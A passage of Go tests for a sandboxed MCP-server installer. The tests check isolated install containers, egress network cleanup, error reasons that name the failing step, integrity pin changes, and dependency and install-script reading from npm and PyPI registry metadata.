		t.Errorf("the install proxy's resolv.conf is bound from %q (relabel %v), want a file this install made under the server store %q", path, relabel, store3)
	}
	if _, err := os.Stat(stale); !os.IsNotExist(err) {
		t.Errorf("a killed install's resolv.conf directory was not swept: %v", err)
	}
	proxy, _ := fake3.FindRun("agentry-mcpproxy-")
	if proxy.Runtime != "runsc" || len(proxy.ExtraNetworks) != 1 || !strings.HasSuffix(proxy.ExtraNetworks[0], "-out") {
		t.Fatalf("install proxy runtime = %q networks %v, want runsc on the install's egress network", proxy.Runtime, proxy.ExtraNetworks)
	}
	if !strings.Contains(conf, "nameserver 192.0.2.53\n") {
		t.Fatalf("the install proxy's resolv.conf = %q", conf)
	}
	started, removedAfter := false, false
	for _, c := range fake3.Calls {
		if c.Op == "NetworkConnect" {
			t.Errorf("a connect after start under the runtime: %s", c.Arg)
		}
		if (c.Op == "RunDetached" || c.Op == "Start") && c.Arg == proxy.Name {
			started = true
		}
		if c.Op == "NetworkRemove" && c.Arg == proxy.ExtraNetworks[0] && started {
			removedAfter = true
		}
	}
	if !removedAfter {
		t.Error("the install's egress network was left behind")
	}
	if path, _, _ := strings.Cut(conf, "\n"); path != "" {
		if _, err := os.Stat(path); !os.IsNotExist(err) {
			t.Errorf("the install proxy's resolv.conf was left behind: %v", err)
		}
	}

	fake2 := &dockerx.Fake{}
	withRunner(fake2)
	if err := EnsureInstalled(t.Context(), fake2, res, t.TempDir(), httpsRegs(regs), images, policy.DockerPolicy{}, io.Discard); err != nil {
		t.Fatal(err)
	}
	if inst, _ := fake2.FindRun("agentry-mcpinstall-"); inst.Runtime != "" || len(inst.ExtraHosts) != 0 {
		t.Fatalf("an unset runtime reached the installer: %q, hosts %v", inst.Runtime, inst.ExtraHosts)
	}
}

// A builder that refuses the package's engines.node (npm_builder.js exit 5)
// fails the install with a sentence that names the runtime image and the
// policy key, and records no resolution, so the next try installs afresh.
func TestEnsureInstalledNamesAnEnginesRefusal(t *testing.T) {
	regs := fakeRegistries(t)
	res, err := ResolveAll(t.Context(), nil, regs, []manifest.MCPServer{decl("@scope/server-x", "", "1.2.3")})
	if err != nil {
		t.Fatal(err)
	}
	store := t.TempDir()
	fake := withRunner(&dockerx.Fake{Foreground: map[string]*dockerx.FakeForeground{
		"agentry-mcpinstall-": {ExitCode: npmEnginesRefused},
	}})
	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}
	err = EnsureInstalled(t.Context(), fake, res, store, httpsRegs(regs), images, policy.DockerPolicy{}, io.Discard)
	if err == nil {
		t.Fatal("an engines refusal installed")
	}
	for _, want := range []string{"@scope/server-x@1.2.3", "node:test", "images.nodeRuntime"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error %q does not name %q", err, want)
		}
	}
	if _, err := os.Stat(filepath.Join(store, "npm-scope-server-x.json")); !os.IsNotExist(err) {
		t.Fatalf("a refused install recorded a resolution (%v)", err)
	}
}

// Each install step that fails names the declared server and itself in
// the run's reason, never text.
func TestEnsureInstalledNamesTheStepThatFailed(t *testing.T) {
	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}
	regs := httpsRegs(policy.MCPRegistries{NPM: "https://unused.invalid", PyPI: "https://unused.invalid"})
	server := func() []Resolved {
		return []Resolved{{Source: "npm", Package: "@scope/server-x", Version: "1.0.0", ID: "npm-scope-server-x", BinName: "server-x"}}
	}
	cases := []struct {
		name   string
		script func(f *dockerx.Fake)
		code   receipt.ReasonCode
		step   string
	}{
		{"image", func(f *dockerx.Fake) { f.FailPull = map[string]error{"node:test": errors.New("no route")} },
			receipt.ReasonMCPInstallFailed, receipt.InstallImage},
		{"install proxy", func(f *dockerx.Fake) {
			f.FailDetached = map[string]error{"agentry-mcpproxy-": errors.New("runsc: cannot start")}
		}, receipt.ReasonMCPInstallFailed, receipt.InstallProxy},
		{"builder", func(f *dockerx.Fake) {
			f.Foreground = map[string]*dockerx.FakeForeground{"agentry-mcpinstall-": {ExitCode: 1}}
		}, receipt.ReasonMCPInstallFailed, receipt.InstallBuilder},
		{"runtime excluded", func(f *dockerx.Fake) {
			f.Foreground = map[string]*dockerx.FakeForeground{"agentry-mcpinstall-": {ExitCode: npmEnginesRefused}}
		}, receipt.ReasonMCPRuntimeExcluded, ""},
		{"runtime unchecked", func(f *dockerx.Fake) {
			f.Foreground = map[string]*dockerx.FakeForeground{"agentry-mcpinstall-": {ExitCode: npmEnginesUnchecked}}
		}, receipt.ReasonMCPInstallFailed, receipt.InstallRuntimeCheck},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			fake := withRunner(&dockerx.Fake{})
			c.script(fake)
			err := EnsureInstalled(t.Context(), fake, server(), t.TempDir(), regs, images, policy.DockerPolicy{}, io.Discard)
			want := &receipt.Reason{Code: c.code, Detail: c.step, Names: []string{"npm:@scope/server-x"}}
			if got := receipt.ReasonOf(err); !reflect.DeepEqual(got, want) {
				t.Fatalf("reason = %+v, want %+v (err %v)", got, want, err)
			}
		})
	}

	t.Run("pin changed", func(t *testing.T) {
		store, fake := t.TempDir(), withRunner(&dockerx.Fake{})
		first := server()
		first[0].Integrity = "sha512-OLD"
		if err := EnsureInstalled(t.Context(), fake, first, store, regs, images, policy.DockerPolicy{}, io.Discard); err != nil {
			t.Fatal(err)
		}
		drifted := server()
		drifted[0].Integrity = "sha512-NEW"
		err := EnsureInstalled(t.Context(), fake, drifted, store, regs, images, policy.DockerPolicy{}, io.Discard)
		want := &receipt.Reason{Code: receipt.ReasonMCPInstallFailed, Detail: receipt.InstallPinChanged, Names: []string{"npm:@scope/server-x"}}
		if got := receipt.ReasonOf(err); !reflect.DeepEqual(got, want) {
			t.Fatalf("reason = %+v, want %+v (err %v)", got, want, err)
		}
	})
}

// A pin the registry does not have names the declared server.
func TestResolveAllNamesTheServerItCouldNotResolve(t *testing.T) {
	regs := fakeRegistries(t)
	_, err := ResolveAll(t.Context(), nil, regs, []manifest.MCPServer{decl("@scope/no-such-server", "", "9.9.9")})
	want := &receipt.Reason{Code: receipt.ReasonMCPNotResolved, Names: []string{"npm:@scope/no-such-server"}}
	if got := receipt.ReasonOf(err); err == nil || !reflect.DeepEqual(got, want) {
		t.Fatalf("reason = %+v, want %+v (err %v)", got, want, err)
	}
}

// A remote server is neither resolved nor installed, and
// becomes a plan spec of its own: its address, auth, tools, bearer secret
// and its one host.
func TestRemoteServersAreSpecsNotPackages(t *testing.T) {
	servers := []manifest.MCPServer{
		{URL: "https://api.githubcopilot.com/mcp/readonly", Auth: manifest.AuthSecret, Secrets: []string{"GITHUB_TOKEN"}, Tools: []string{"get_me"}},
	}
	if got := Packages(servers); len(got) != 0 {
		t.Fatalf("Packages kept a remote server: %+v", got)
	}
	res, err := ResolveAll(context.Background(), nil, policy.MCPRegistries{NPM: "https://127.0.0.1:1", PyPI: "https://127.0.0.1:1"}, servers)
	if err != nil || len(res) != 0 {
		t.Fatalf("ResolveAll on a remote server: %v %+v", err, res)
	}
	specs := Specs(nil, servers, policy.Default().Images)
	want := spec.MCPServerSpec{
		Name: "mcp-url-api-githubcopilot-com-mcp-readonly", Source: spec.SourceURL,
		Package: "https://api.githubcopilot.com/mcp/readonly",
		Tools:   []string{"get_me"}, Egress: []string{"api.githubcopilot.com:443"},
		Secrets: []string{"GITHUB_TOKEN"}, Auth: "secret",
	}
	if len(specs) != 1 || !reflect.DeepEqual(specs[0], want) {
		t.Fatalf("Specs = %+v\nwant %+v", specs, want)
	}
	if !specs[0].Remote() || specs[0].Ref() != "https://api.githubcopilot.com/mcp/readonly" || specs[0].RemoteHost() != "api.githubcopilot.com" || !specs[0].SendsBearer() {
		t.Fatalf("spec helpers: %+v", specs[0])
	}
}

// The Drafter's server check reads a release's direct dependencies and
// install scripts from the one metadata request a resolution already makes,
// so what leaves the machine does not grow.
func TestResolveAllReadsDependenciesFromItsOneRequest(t *testing.T) {
	var requests atomic.Int32
	mux := http.NewServeMux()
	mux.HandleFunc("GET /dep-server/2.0.0", func(w http.ResponseWriter, _ *http.Request) {
		requests.Add(1)
		_, _ = w.Write([]byte(`{"name":"dep-server","bin":"cli.js","dependencies":{"zod":"^3","puppeteer":"^22"},
		  "peerDependencies":{"playwright":"*","sharp":"*"},"peerDependenciesMeta":{"sharp":{"optional":true}},
		  "scripts":{"build":"tsc","postinstall":"node fetch-browser.js","install":" ","preinstall":["odd"]},"dist":{"tarball":"t","integrity":"sha512-CCC"}}`))
	})
	// An old packument's odd shapes read as empty, never a failed resolution.
	mux.HandleFunc("GET /old-server/0.1.0", func(w http.ResponseWriter, _ *http.Request) {
		requests.Add(1)
		_, _ = w.Write([]byte(`{"name":"old-server","bin":"cli.js","dependencies":["zod"],"scripts":"make","peerDependencies":null,"dist":{"tarball":"t","integrity":"sha512-DDD"}}`))
	})
	mux.HandleFunc("GET /pypi/Markitdown_MCP/0.0.1a7/json", func(w http.ResponseWriter, _ *http.Request) {
		requests.Add(1)
		_, _ = w.Write([]byte(`{"info":{"requires_dist":[
		  "markitdown[all]>=0.1.1",
		  "mcp~=1.8.0",
		  "Onnx.Runtime (>=1.17) ; python_version >= \"3.10\"",
		  "pytest ; extra == \"test\"",
		  "mcp>=1"]},
		  "urls":[{"packagetype":"bdist_wheel","filename":"m-0.0.1a7-py3-none-any.whl","digests":{"sha256":"aa"}}]}`))
	})
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)
	res, err := ResolveAll(t.Context(), nil, policy.MCPRegistries{NPM: srv.URL, PyPI: srv.URL}, []manifest.MCPServer{
		decl("dep-server", "", "2.0.0"),
		decl("", "Markitdown_MCP", "0.0.1a7"),
		decl("old-server", "", "0.1.0"),
	})
	if err != nil {
		t.Fatal(err)
	}
	if got := requests.Load(); got != 3 {
		t.Fatalf("%d registry requests for three servers, want one each", got)
	}
	if len(res[2].Dependencies) != 0 || len(res[2].InstallScripts) != 0 || res[2].BinName != "old-server" {
		t.Fatalf("old packument: %+v", res[2])
	}
	if got := strings.Join(res[0].Dependencies, ","); got != "playwright,puppeteer,zod" {
		t.Fatalf("npm dependencies = %q, want dependencies and the peers that are not optional", got)
	}
	if got := strings.Join(res[0].InstallScripts, ","); got != "postinstall" {
		t.Fatalf("npm install scripts = %q, want the non-empty lifecycle scripts only", got)
	}
	if got := strings.Join(res[1].Dependencies, ","); got != "markitdown,mcp,onnx-runtime" {
		t.Fatalf("pypi dependencies = %q, want normalized names without the extras' requirements", got)
	}
	if len(res[1].InstallScripts) != 0 {
		t.Fatalf("pypi install scripts = %v", res[1].InstallScripts)
	}
	// Neither is part of the recorded resolution.
	b, err := json.Marshal(res[0])
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(b), "puppeteer") || strings.Contains(string(b), "postinstall") {
		t.Fatalf("recorded resolution carries the check's metadata: %s", b)
	}
}
